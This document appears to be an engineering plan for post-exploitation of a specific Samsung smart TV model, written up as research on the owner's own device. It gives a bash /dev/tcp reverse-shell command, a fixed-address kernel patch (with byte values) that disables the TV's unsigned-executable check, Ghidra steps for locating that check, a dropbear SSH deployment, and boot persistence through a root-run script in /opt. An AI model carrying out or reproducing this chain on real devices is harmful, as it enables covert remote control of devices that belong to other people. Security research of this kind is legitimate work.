# Post-exploitation plan — GQ65Q70RGTXZG / T-MSMDEUC-1500.9

Foothold → command channel → mitigation removal → persistent SSH.

Owner's own hardware. Out of scope for Samsung's bounty (2022–2026 models only),
so this is research, not a submission.

**Precondition for everything below:** a kernel R/W or code-execution primitive
from the USB filesystem parsers (lanes exploit-004/005/006). Nothing here is a
bypass of the boot chain — it all assumes we already have kernel-mode execution
or root, and concerns what to *do* with it.

Evidence key: **[O]** observed, **[D]** derived from firmware/source, **[C]** conjecture.

---

## The two gates that dictate ordering

**1. UEP — Unsigned Executable Prevention** `[O]`
`CONFIG_SECURITY_SFD_UEP=y` with `UEP_CHECK_LIBRARY`, `UEP_CHECK_PROCESS`,
`UEP_CHECK_MODULE`. Observed in the lab refusing our own busybox:

```
[E][UEP]: [SfdUepHandleVerificationResult] file /bin/busybox is not signed. Sign it.
Failed to execute /bin/busybox (error -1)      <- EPERM, not ENOEXEC
```

Consequences: cannot exec any binary we bring, cannot load an unsigned `.ko`
(`UEP_CHECK_MODULE`), and libraries are checked on mmap too.

**2. Mount flags on removable media — RESOLVED** `[O]`
`storaged`'s `module_block.so` mounts with
`uid=0,gid=10001,dmask=0000,fmask=0111,...` (`fmask=0111` strips the execute
bit from every file), **and** the generic block-mount helper
`FUN_0001d708` @ `0x1d708` passes:

```c
__rwflag = 0xf;                     // MS_RDONLY|MS_NOSUID|MS_NODEV|MS_NOEXEC
if (param_4 == 0) __rwflag = 0xe;   // rw variant: MS_NOSUID|MS_NODEV|MS_NOEXEC
mount(source, target, fstype, __rwflag, data);
// retries with 0xf if errno == 30 (EROFS)
```

So `MS_NOEXEC` (8), `MS_NOSUID` (2) and `MS_NODEV` (4) are set
**unconditionally** — the only variable bit is `MS_RDONLY`. The three
fs-specific handlers (`ext4_mount` / `exfat_mount` / `ntfs_mount`, from
`src/block/*.c`) reach it through the handler table, so this covers every
removable mount.

⇒ **A binary on the USB stick cannot be executed, even as root, even with UEP
off** — `noexec` at the mount level plus no exec bits from `fmask`. A second
partition is a fine *transport*; it is not an execution location. This makes
staging to `/opt` **mandatory rather than merely preferable**.

Three ways past it, cheapest first:
1. **Copy to `/opt` and `chmod +x`** — needs no patch at all, since `/opt` is
   mounted without `noexec` (see Stage 3). Recommended.
2. `mount -o remount,exec <usb>` as root — plain userspace, no kernel work.
3. Clear `MNT_NOEXEC` (`0x04`) in that mount's `struct vfsmount->mnt_flags`
   via the kernel R/W primitive. Only worth it if `/opt` is unavailable.

---

## Stage 1 — temporary foothold with *zero* new binaries

The nice result: we do not need to defeat UEP to get an interactive shell,
because the TV ships a shell that can open sockets itself.

`/bin/bash` (signed, `/bin/sh` → `bash`) contains `[O]`:

```
/dev/tcp/*/*
/dev/udp/*/*
```

so it was built **with** net redirections. Therefore:

```sh
bash -i >& /dev/tcp/<LAN-IP>/4444 0>&1
```

This execs **only the already-signed `/bin/bash`**; the script is data, not an
executable, so UEP has nothing to verify `[D]`. `curl` is also present and
supports `http/https/ftp/sftp/telnet/tftp/gopher/dict` `[O]`, giving a
fallback polling channel (`curl` a command file, POST the output) if raw TCP is
filtered.

Delivery is now implemented and lab-verified `[O]`: the exFAT overwrite copies
a position-independent stage into the fixed core-text cave
`0xc0008358..0xc0009000`, flushes it, patches UEP, restores SP into the genuine
task stack, and calls `call_usermodehelper()` with signed `/bin/bash -c '...'`.
The helper runs asynchronously (`UMH_NO_WAIT`) and waits for p2 under Samsung's
`/opt/media/extendedsd`, then executes p2 `stage1.sh`. The exact TV stage is
built by `tools/build_kernel_stage.py`; complete image assembly is
`tools/mk_usb_stick.py --exploit-profile tv`.

**No `nc`, `socat`, `python`, `perl`, `ssh`, `sshd` or `dropbear` exist on the
device** `[O]` — bash + curl is genuinely the whole toolbox until UEP is down.

## Stage 2 — remove the mitigations

Order matters: UEP must fall before any brought binary runs.

- **Source is available** for the whole framework:
  `vendor/linux-4.1.10/security/sfd/` — including `uep/SfdUep.c`,
  `uep/SfdUepHookHandlers.c`, `uep/SfdUepEntry.c` `[O]`.
- State lives in a single file-static struct: `static SfdUepContext s_uepContext;`
  (`SfdUepEntry.c:28`), opened by `SfdOpenUepContext()` `[O]`. That is the
  natural target for a kernel write: neutralise the context, or stub the
  verification result so `SfdUepHandleVerificationResult` always sees
  `SF_STATUS_OK`.
- Because the target kernel has **no KASLR, no kernel text RO/NX and no module
  signing** `[O, from uImage + defconfig]`, patching kernel text in place is
  viable once we have a write primitive — that combination is what makes this
  easy rather than hard.

### The UEP gate in the shipped kernel — LOCATED `[O]`

The kernel image has no kallsyms, but it **retains the SFD/UEP `__func__`
strings**, which are usable anchors. Method (reproducible):

```sh
# carve the raw kernel: 64-byte u-boot header, load addr 0x80008000 PHYSICAL,
# but the kernel RUNS at virtual 0xc0008000 (confirmed by lab oops traces:
# c0010314, c05c1a64). Import at 0xc0008000 or literal pools will not resolve.
dd if=out/uImage of=vmlinux.bin bs=64 skip=1
ghidra_project SamsungTV ignored -import vmlinux.bin \
  -processor ARM:LE:32:v7 -loader BinaryLoader -loader-baseAddr 0xc0008000
tools/ghidra-run.sh SamsungTV uImage-kernel-c0.bin FindUepGate.java
```

Result:

| item | address |
|---|---|
| `"SfdUepHandleVerificationResult"` string | `0xc0555188` |
| `"SfdUepVerifyFileSignature"` string | `0xc0555114` |
| **UEP verification gate (function)** | **`0xc01d49b8`** (3108 bytes) |
| SFD operation handlers that call it | `0xc01d5620`, `0xc01d5684` |

The gate's `switch` on the verification status maps **exactly** onto
`include/uapi/linux/sf/core/SfStatus.h` from the vendor tree, which is what
confirms the identification rather than merely suggesting it:

| decompiled case | enum value | log string in the image |
|---|---|---|
| `case 2` | `SF_STATUS_UEP_SIGNATURE_CORRECT = 2` | `"Verification correct ... Level"` |
| `case 3` | `SF_STATUS_UEP_SIGNATURE_INCORRECT = 3` | `"file %s has incorrect signature"` |
| `case 4` | `SF_STATUS_UEP_FILE_NOT_SIGNED = 4` | `"file %s is not signed. Sign it."` |
| `case 6` | `SF_STATUS_UEP_FILE_NO_MAGICNUM = 6` | `"doesn't has magic number"` |
| `case -1` | `SF_STATUS_FAIL = -1` | `"signature general check error"` |

The two callers store the returned status into the SFD operation struct
(`param_1[6]` and `param_1[3]`) and the dispatcher enforces on it.

**Minimal patch** (`SF_STATUS_OK = 0`, `SIGNATURE_CORRECT = 2`): overwrite the
prologue of `0xc01d49b8` so it always reports success — two words, at a fixed
absolute address, with no KASLR and no text write protection:

```
c01d49b8:  e3a00002    mov r0, #2      ; SF_STATUS_UEP_SIGNATURE_CORRECT
c01d49bc:  e12fff1e    bx  lr
```

`[C]` Which of `0` or `2` the dispatcher accepts is not yet proven — `2` is the
value the code's own success path produces, so it is the safer choice, but this
is the one step to verify on-device (or by decompiling the dispatcher's use of
the stored status). Everything above it is `[O]`.
- `CONFIG_SECURITY_SFD` also dispatches on `exec`, `mmap` and
  `load_kernel_module`; SMACK remains active and is a separate concern
  (tmpfs mounts are `nosuid,noexec,nodev` `[O]`).

Verification note: the lab **cannot** validate the UEP bypass, because we have
no Samsung signing key, so *every* binary in the lab is unsigned and SFD had to
be compiled out entirely to boot at all. UEP work is therefore source-review +
on-device testing only. Do not let a lab "success" imply anything here.

Cross-cutting constraint from the ext4 lane (round 2): the Muse.M defconfig sets
`CONFIG_BUSYLOOP_WHILE_OOPS=y` — `oops_end()` spins with other CPUs stopped.
Every candidate primitive is therefore **one-shot and must-not-fault**: a
faulting trigger leaves no kernel to exploit. This rules out spray-and-see
approaches on the target and raises the bar for the exFAT chain (see
findings/exploit-006 §verdict and notes/USB-STICK.md).

## Stage 3 — your dropbear plan, in the right slot

Once UEP is down:

1. Carry a **static** ARMv7 dropbear (+ `dropbearkey`, or a prebuilt host key)
   and your `authorized_keys` on the stick's second partition. Static avoids
   `UEP_CHECK_LIBRARY` on any shared libs and avoids glibc-version mismatch
   with Tizen 5.0.
2. Do **not** exec from the stick (`fmask=0111`). Copy to an exec-capable
   writable location and `chmod +x` there.
3. That location is **`/opt`**: `mount.sh` mounts it as
   `mount -t vdfs -o dncs /dev/mmcblk0p21 /opt` `[O]` — a writable VDFS
   partition, and notably **without `noexec`**. `/mnt/systemrw` also exists as a
   writable area `[O]`.
4. Run `dropbear -r <hostkey> -p 22 -F -E` and use your own keys. `iptables`
   is present on the device `[O]`, so check for any INPUT policy that would
   block inbound 22 before assuming reachability.

## Stage 4 — persistence

The strong candidate, found by looking for root-executed *scripts* (UEP-immune)
on the *writable* partition:

```
/usr/lib/systemd/system/AT-HUB.service
  ExecStart=/opt/etc/parseinfo.sh &
  WantedBy=starter.target
  (no User= → runs as root)
enabled: usr/lib/systemd/system/starter.target.wants/AT-HUB.service   [O]
```

So a **root-owned systemd unit in the read-only rootfs executes a shell script
from the writable partition at every boot.** Appending a launcher to
`/opt/etc/parseinfo.sh` gives persistence that:

- needs no signed binary (it is a script run by signed bash) `[D]`
- requires no modification of the read-only rootfs or any signed image `[D]`
- survives reboot, and should survive OTA firmware updates, since updates
  replace `platform.img` while `/opt` is the data partition `[C — verify]`
- is presumably destroyed by a factory reset `[C]`

Unknown until we are on the device: whether `/opt/etc/parseinfo.sh` already
exists and what it contains — `/opt` is an empty mountpoint in `platform.img`
`[O]`, so its contents are device-local and cannot be inspected offline. If the
file is absent, the unit may fail harmlessly, in which case *creating* it is the
persistence step.

### What boot-persistence CAN and CANNOT do (corrected after the DEVMEM finding)

`parseinfo.sh` runs as root at every boot **regardless of UEP** — it is a
script, so `binfmt_script` chains the exec to `/bin/bash`, and `bash` is
signed `[D — consistent with how AT-HUB works on stock firmware]`.
Persistence of *script execution* and of *staging* (copying the stick's
payload partition into `/opt`, installing `authorized_keys`, preparing a
`/run` unit) therefore needs no kernel access.

But executing the unsigned `dropbear` needs the UEP gate down, and the two
obvious boot-time ways to bring it down are both closed on this build `[O]`:

| idea | verdict |
|---|---|
| `dd if=patch of=/dev/mem seek=...` | **dead** — `# CONFIG_DEVMEM is not set` at `Muse.M-Tizen_release_defconfig:1547`, `/dev/mem` does not exist; verified in the lab (`mknod /dev/mem c 1 1` → open() gives `ENXIO`) |
| `insmod` a helper .ko from `/opt` | **dead** — `load_kernel_module` is itself an SFD dispatcher (`[O]`, security/sfd), so unsigned modules are refused |

The gate therefore comes down only where the exploit primitive itself runs:
**the crafted trigger partition (p1) on the stick**. That also resolves
reboot: with the stick left inserted, every boot re-probes p1 as the trigger
filesystem, the LPE fires, UEP is patched in kernel memory, and `parseinfo.sh`
(or the exploit payload itself) starts dropbear. Without the stick, the
`parseinfo.sh` anchor still keeps `/root/.ssh/authorized_keys` and the staged
`/opt` tree fresh — only the exec of unsigned binaries waits for the next
plug-in. `[D — model; the auto-remount timing at boot is on-device [C]]`

Other candidates seen in `/opt`, all root `ExecStart=` paths on the writable
partition (`bms-service`, `canalysis-daemon`, `ep-hotel-hms`,
`airplay-service`) `[O]` — but those are binaries, so replacing them would run
into UEP unless UEP is already disabled at that point in boot. **The script hook
is strictly better**, which is why it is the recommendation.

### Bringing our own systemd unit instead

Cleaner than editing someone else's script, and it works — but only for the
current boot, so it solves staging rather than persistence.

systemd's unit search path contains exactly one writable directory `[O]`:

```
/run/systemd/system      <- tmpfs, writable, VOLATILE
/etc/systemd/system      <- real dir inside platform.img (read-only VDFS4, hash-verified)
/usr/lib/systemd/system  <- same read-only image
```

So:

- **Temporary / session use — do this.** Drop a unit in
  `/run/systemd/system/`, `systemctl daemon-reload`, `systemctl start`. That
  gives dropbear proper supervision (restart-on-failure, logging, a clean
  environment) without touching any signed image, and it evaporates on reboot,
  which is a *feature* while iterating.
- **Persistence — a unit alone cannot do it.** Both persistent unit
  directories live on the read-only, hash-verified rootfs; writing there means
  defeating VDFS4 image verification, which is far more work than the whole
  rest of this plan.

⇒ Best of both: keep the persistent anchor in `/opt` (one line appended to
`/opt/etc/parseinfo.sh`, which root already executes every boot), and have that
line install and start the real unit into `/run/systemd/system`. The persistent
footprint stays one line of shell on the data partition; everything structured
lives in a proper unit, recreated each boot.

---

## Sequenced summary

| # | Step | Needs UEP off? | Brings a binary? |
|---|---|---|---|
| 0 | kernel primitive via USB filesystem parser | – | no |
| 1 | `bash -i >& /dev/tcp/IP/PORT` reverse shell | **no** | **no** |
| 2 | patch/neutralise `s_uepContext` + SFD | – | no |
| 3 | copy static dropbear stick → `/opt`, `chmod +x`, run with your keys | yes | yes |
| 4 | one line in `/opt/etc/parseinfo.sh` → installs+starts a unit in `/run/systemd/system` | no | no |

Design principle: every step that *can* avoid UEP does, so the only step
depending on the (least certain) mitigation bypass is the one that genuinely
needs a real binary.

## Open questions, in priority order

1. ~~Does `storaged` pass `MS_NOEXEC`/`MS_NOSUID`?~~ **RESOLVED: yes, both,
   unconditionally** (`0xe`/`0xf` at `0x1d708`). Stage to `/opt`.
2. ~~Where do `s_uepContext` and the UEP hook live in the shipped `uImage`?~~
   **RESOLVED: gate at `0xc01d49b8`; stage writes `mov r0,#2; bx lr` and flushes
   the range.** `2` is `SF_STATUS_UEP_SIGNATURE_CORRECT`, the verifier's normal
   success value.
3. ~~Does `call_usermodehelper` survive the path?~~ **RESOLVED in the exact
   vendor-kernel lab:** the cave stage executed the signed shell, and the
   no-wait helper launched p2 stage1 which started dropbear.
4. `/opt/etc/parseinfo.sh` is absent in platform.img; stage1 creates it. Whether
   `/opt` survives OTA remains device-only.
5. Is there an `iptables` INPUT policy that blocks inbound SSH? If so build with
   `--beacon HOST:PORT` for the signed-bash reverse-shell fallback.
